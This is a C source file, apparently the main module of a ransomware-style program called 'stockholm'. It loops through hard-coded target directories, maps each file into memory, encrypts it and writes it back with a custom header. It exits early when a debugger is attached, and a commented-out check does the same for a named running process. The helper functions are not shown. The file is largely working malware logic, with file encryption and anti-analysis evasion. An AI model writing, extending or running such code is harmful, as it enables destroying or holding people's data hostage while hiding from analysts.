#include "stockholm.h"

unsigned char			*g_mapped_data;
uint16_t				g_modes;
fa_t_stockhlm_header	g_stockhlm_header;

void fa_loop_throught_directory_and_encrypt(char *target_dir_path, DIR *dp)
{
	// Pointer to hold directory entry information
	struct dirent *entry;

	// Loop through each entry in the directory
	while ((entry = readdir(dp)) != NULL)
	{
		// Check if the entry name starts with a dot (.)
		// This is to skip the current (.) and parent (..) directory entries
		if (entry->d_name[0] != '.')
		{
			// Create a buffer to hold the full path
			char target_path[1024];

			// Use snprintf() to safely concatenate the strings
			snprintf(target_path, sizeof(target_path), "%s%s", target_dir_path, entry->d_name);

			/* Create a mapping between the target file and the memory region occupied
			 * by the program. This is to facilitate the memory handling to manipulate
			 * the file data.
			 *
			 * Then, process the encryption
			 */

			if (fa_map_file_into_memory(target_path))
			{
				if (g_modes & FA_VERBOSE)
					perror("An error occurred while attempting to map the file into memory");
				// Skip the rest of the steps in case of errors
				continue;
			}

			if (fa_process_mapped_data())
			{
				if (g_modes & FA_VERBOSE)
					perror("An error occurred while attempting to process the mapped data");
				continue;
			}

			// Write the final file data in the target path
			if (fa_write_processed_data_to_file(target_path))
			{
				if (g_modes & FA_VERBOSE)
					perror("An error occurred while attempting to write the mapped data into the file");
				continue;
			}
		}
	}
}

void init_stockholm_header()
{
	// Set the file signature
	memcpy(g_stockhlm_header.signature, FA_SIGNATURE, FA_MAGICNBR_LEN);
	// Set the size of the encrypted AES key
	g_stockhlm_header.encrypted_key_len = FA_AES_ENCRYPT_KEY_LEN;
}

int main(int argc, char *argv[])
{
	(void)argc;

	if (pc_is_debugger_attached())
	{
		if (g_modes & FA_VERBOSE)
			printf("Debugger detected. Exiting...\n");
		return 0; // Exit if a debugger is detected
	}

	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
	// 	if (g_modes & FA_VERBOSE)
	// 		printf("The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// Parse the arguments given through the commannd line
	fa_parse_argv(argv);

	// Init the header that will be placed at the top of the file
	init_stockholm_header();

	// Declare the injection target directory paths
	char *target_dir_paths[FA_TARGET_ARRAY_SIZE] = FA_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < FA_TARGET_ARRAY_SIZE; ++i)
	{
		DIR *dp = opendir(target_dir_paths[i]);
		if (!dp) return 0;

		fa_loop_throught_directory_and_encrypt(target_dir_paths[i], dp);

		// Close the directory stream
		closedir(dp);
	}
}
